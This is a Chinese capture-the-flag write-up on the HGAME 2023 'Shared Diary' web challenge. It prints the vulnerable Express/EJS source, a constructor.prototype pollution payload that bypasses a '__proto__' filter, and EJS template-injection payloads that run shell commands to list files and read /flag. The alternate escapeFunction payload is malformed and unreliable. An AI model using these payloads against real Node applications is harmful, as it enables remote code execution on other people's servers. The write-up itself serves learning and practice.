# [HGAME 2023 week4]Shared Diary

## 知识点

>   js 原型链污染

>   ejs 模板引擎 RCE

>   ejs ssti

## 解题

**查看附件，主要的代码为：app.js**

```js
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const randomize = require('randomatic');
const ejs = require('ejs');
const path = require('path');
const app = express();

function merge(target, source) {
    
    for (let key in source) {
        // 防止原型污染
        if (key === '__proto__') {
            throw new Error("Detected Prototype Pollution")
        }
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}

app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json());
app.set('views', path.join(__dirname, "./views"));
app.set('view engine', 'ejs');
app.use(session({
    name: 'session',
    secret: randomize('aA0', 16),
    resave: false,
    saveUninitialized: false
}))

app.all("/login", (req, res) => {
    if (req.method == 'POST') {
        // 将用户信息保存到会话
        let data = {};
        try {
            merge(data, req.body)
        } catch (e) {
            return res.render("login", {message: "Don't pollution my shared diary!"})
        }
        req.session.data = data

        // check password
        let user = {};
        user.password = req.body.password;
        if (user.password=== "testpassword") {
            user.role = 'admin'
        }
        if (user.role === 'admin') {
            req.session.role = 'admin'
            return res.redirect('/')
        }else {
            return res.render("login", {message: "Login as admin or don't touch my shared diary!"})
        } 
    }
    res.render('login', {message: ""});
});

app.all('/', (req, res) => {
    if (!req.session.data || !req.session.data.username || req.session.role !== 'admin') {
        return res.redirect("/login")
    }
    if (req.method == 'POST') {
        let diary = ejs.render(`<div>${req.body.diary}</div>`)
        req.session.diary = diary
        return res.render('diary', {diary: req.session.diary, username: req.session.data.username});
    }
    return res.render('diary', {diary: req.session.diary, username: req.session.data.username});
})


app.listen(8888, '0.0.0.0');
```

### 分析

>   分析以上代码可以得知

-   存在两个界面
    -   `/longin`
        -   登录可以获得session
        -   但是存在过滤，过滤掉了`__proto__`直接操作原型链的方法，但是还是还有别的方法操作
            -   `constructor.protoype`
        -   并不能直接将`role`的值赋值为`admin`
    -   `/`
        -   进入主页条件是需要session中的`role = admin`

### 注入

-   **首先肯定就是使用原型链将给role赋值**

    -   不过首先需要先正常登录一下，**拿到一个session**，一上来就原型链注入不知道为啥进不去，一直被挡在外面

-   **然后使用原型链发数据，并且需要修改`Content-Type`为`application/json`**

    -   ```json
        {"constructor": {"prototype": {"role": "admin"}},"username":"admin","password":"admin"}
        ```

-   使用`burpsuite`发包的得把session复制一下，然后丢浏览器中设置好这个session

-   然后去访问主页：`/`

-   然后再看源码中的`app.js`

    -   ```js
         let diary = ejs.render(`<div>${req.body.diary}</div>`)
        ```

    -   这里存在一个`ejs ssti`

    -   可以插⼊ `<%- %>` 标签来执行任意js

    -   那么就可以直接获取flag

-   ```js
    // 列文件
    <%- global.process.mainModule.require('child_process').execSync('ls -al /') %>
    // 拿flag    
    <%- global.process.mainModule.require('child_process').execSync('cat /flag') %>
    ```

-   **另一解法使用`ejs`的`rce`**

-   ```json
    {"constructor": {"prototype": {"role": "admin"，{"client":true,"escapeFunction":"1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');"}}},"username":"ek1ng","password":"123"}
    
    ```

    



参考：

https://www.anquanke.com/post/id/236354

http://thnpkm.xyz/index.php/archives/111/#cl-17

